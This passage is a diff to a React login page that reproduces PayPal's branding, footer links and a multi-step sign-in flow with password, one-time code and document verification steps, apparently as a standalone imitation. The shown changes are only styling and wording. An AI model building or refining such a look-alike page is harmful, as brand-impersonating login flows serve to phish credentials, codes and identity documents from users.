+                  const prevInput = (e.target as HTMLElement).previousElementSibling as HTMLInputElement;
+                  if (prevInput) prevInput.focus();
+                }
+              }}
+              className="w-12 h-14 text-center text-[24px] font-semibold border border-[#cbd2d6] dark:border-[#3d3d3d] rounded-lg bg-white dark:bg-[#1a1a1a] text-[#111b2a] dark:text-white focus:outline-none focus:border-[#005ea6] focus:ring-1 focus:ring-[#005ea6]"
+              data-testid={`input-code-${index}`}
+              autoFocus={index === 0}
+            />
+          ))}
         </div>
 
         <button
           type="submit"
-          className="paypal-btn-primary flex items-center justify-center gap-2"
+          className="paypal-btn-2025"
           disabled={verificationCode.length < 6 || isLoading}
           data-testid="button-verify"
         >
           {isLoading ? (
             <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
           ) : (
-            "Continue"
+            "Verify"
           )}
         </button>
 
-        <div className="text-center pt-2">
+        <div className="text-center">
           <button
             type="button"
-            className="paypal-btn-text"
+            className="text-[14px] text-[#005ea6] hover:text-[#003087] hover:underline font-medium"
             data-testid="button-resend"
             onClick={() => {
               toast({
-                description: `We've sent a new code to ${maskedPhone}`,
+                description: "A new security code has been sent.",
               });
             }}
           >
-            Didn't receive a code?
+            Resend code
           </button>
         </div>
       </div>
@@ -727,16 +662,13 @@ export default function LoginPage() {
   );
 
   return (
-    <div className="min-h-screen bg-white dark:bg-[#0a0a0a] flex flex-col">
-      {/* Main Content */}
-      <main className="flex-1 flex flex-col items-center pt-10 sm:pt-16 pb-8 px-4">
-        {/* Logo */}
-        <div className="mb-10">
+    <div className="min-h-screen bg-[#f5f7fa] dark:bg-[#0a0a0a] flex flex-col">
+      <main className="flex-1 flex flex-col items-center pt-12 sm:pt-16 pb-8 px-4">
+        <div className="mb-8">
           <img src="/favicon.png" alt="PayPal" className="h-[40px] sm:h-[48px] w-auto" />
         </div>
 
-        {/* Login Card */}
-        <div className="paypal-card w-full max-w-[440px]">
+        <div className="w-full max-w-[420px] bg-white dark:bg-[#121212] rounded-lg border border-[#e5e5e5] dark:border-[#2a2a2a] p-8 shadow-sm">
           {step === "email" && renderEmailStep()}
           {step === "password" && renderPasswordStep()}
           {step === "verify-method" && renderVerifyMethodStep()}
@@ -746,22 +678,19 @@ export default function LoginPage() {
           {step === "verify-documents" && renderVerifyDocumentsStep()}
         </div>
 
-        {/* Security Badge */}
-        <div className="flex items-center justify-center gap-2 mt-8">
-          <Lock className="w-4 h-4 text-[#6c7378] dark:text-[#8f8f8f]" />
-          <span className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f]" data-testid="text-security">
+        <div className="flex items-center justify-center gap-2 mt-6">
+          <Lock className="w-3.5 h-3.5 text-[#6c7378]" />
+          <span className="text-[12px] text-[#6c7378]" data-testid="text-security">
             Secure connection
           </span>
         </div>
       </main>
 
-      {/* Footer */}
-      <footer className="py-6 px-4 border-t border-[#e8e8e8] dark:border-[#2a2a2a]">
+      <footer className="py-5 px-4 border-t border-[#e5e5e5] dark:border-[#2a2a2a] bg-white dark:bg-[#121212]">
         <div className="max-w-[800px] mx-auto">
-          {/* Language Selector */}
-          <div className="flex items-center justify-center gap-1 mb-5">
+          <div className="flex items-center justify-center mb-4">
             <select 
-              className="appearance-none bg-transparent text-[#0070e0] font-medium text-[13px] cursor-pointer hover:text-[#003087] hover:underline focus:outline-none"
+              className="appearance-none bg-transparent text-[#005ea6] font-medium text-[13px] cursor-pointer hover:text-[#003087] hover:underline focus:outline-none"
               data-testid="select-language"
               defaultValue="en"
             >
@@ -775,23 +704,16 @@ export default function LoginPage() {
             </select>
           </div>
 
-          {/* Footer Links */}
-          <div className="flex flex-wrap justify-center gap-x-6 gap-y-2 mb-5">
-            <a href="https://www.paypal.com/us/smarthelp/home" target="_blank" rel="noopener noreferrer" className="paypal-btn-text text-[13px]" data-testid="link-footer-help">Help</a>
-            <a href="https://www.paypal.com/us/smarthelp/contact-us" target="_blank" rel="noopener noreferrer" className="paypal-btn-text text-[13px]" data-testid="link-footer-contact">Contact</a>
-            <a href="https://www.paypal.com/us/webapps/mpp/paypal-fees" target="_blank" rel="noopener noreferrer" className="paypal-btn-text text-[13px]" data-testid="link-footer-fees">Fees</a>
-            <a href="https://www.paypal.com/us/webapps/mpp/paypal-safety-and-security" target="_blank" rel="noopener noreferrer" className="paypal-btn-text text-[13px]" data-testid="link-footer-security">Security</a>
-            <a href="https://www.paypal.com/us/digital-wallet/ways-to-pay/mobile-wallet" target="_blank" rel="noopener noreferrer" className="paypal-btn-text text-[13px]" data-testid="link-footer-apps">Apps</a>
-            <a href="https://www.paypal.com/us/shop" target="_blank" rel="noopener noreferrer" className="paypal-btn-text text-[13px]" data-testid="link-footer-shop">Shop</a>
-            <a href="https://www.paypal.com/us/business" target="_blank" rel="noopener noreferrer" className="paypal-btn-text text-[13px]" data-testid="link-footer-enterprise">Enterprise</a>
-            <a href="https://www.paypal.com/us/webapps/mpp/partner-program" target="_blank" rel="noopener noreferrer" className="paypal-btn-text text-[13px]" data-testid="link-footer-partners">Partners</a>
+          <div className="flex flex-wrap justify-center gap-x-5 gap-y-2 mb-4">
+            <a href="https://www.paypal.com/us/smarthelp/home" target="_blank" rel="noopener noreferrer" className="text-[12px] text-[#005ea6] hover:underline" data-testid="link-footer-help">Help</a>
+            <a href="https://www.paypal.com/us/smarthelp/contact-us" target="_blank" rel="noopener noreferrer" className="text-[12px] text-[#005ea6] hover:underline" data-testid="link-footer-contact">Contact</a>
+            <a href="https://www.paypal.com/us/webapps/mpp/paypal-fees" target="_blank" rel="noopener noreferrer" className="text-[12px] text-[#005ea6] hover:underline" data-testid="link-footer-fees">Fees</a>
+            <a href="https://www.paypal.com/us/webapps/mpp/paypal-safety-and-security" target="_blank" rel="noopener noreferrer" className="text-[12px] text-[#005ea6] hover:underline" data-testid="link-footer-security">Security</a>
+            <a href="https://www.paypal.com/us/digital-wallet/ways-to-pay/mobile-wallet" target="_blank" rel="noopener noreferrer" className="text-[12px] text-[#005ea6] hover:underline" data-testid="link-footer-apps">Apps</a>
+            <a href="https://www.paypal.com/us/shop" target="_blank" rel="noopener noreferrer" className="text-[12px] text-[#005ea6] hover:underline" data-testid="link-footer-shop">Shop</a>
           </div>
 
-          {/* Copyright */}
-          <p 
-            className="text-[12px] text-[#6c7378] dark:text-[#8f8f8f] text-center"
-            data-testid="text-copyright"
-          >
+          <p className="text-[11px] text-[#6c7378] text-center">
             &copy; 1999-{new Date().getFullYear()} PayPal, Inc. All rights reserved.
           </p>
         </div>
